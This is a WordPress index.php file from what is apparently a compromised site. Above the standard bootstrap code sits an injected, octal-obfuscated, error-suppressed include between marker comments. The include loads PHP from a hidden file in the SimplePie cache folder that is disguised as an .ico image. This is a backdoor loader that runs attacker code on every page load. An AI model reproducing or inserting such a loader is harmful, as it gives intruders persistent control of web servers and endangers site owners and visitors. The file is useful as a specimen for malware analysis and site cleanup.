<?php
/*0d02c*/

@include "\057var/\167ww/h\164ml/w\157rdpr\145ss/w\160-inc\154udes\057Simp\154ePie\057Cach\145/.79\1441285\142.ico";

/*0d02c*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
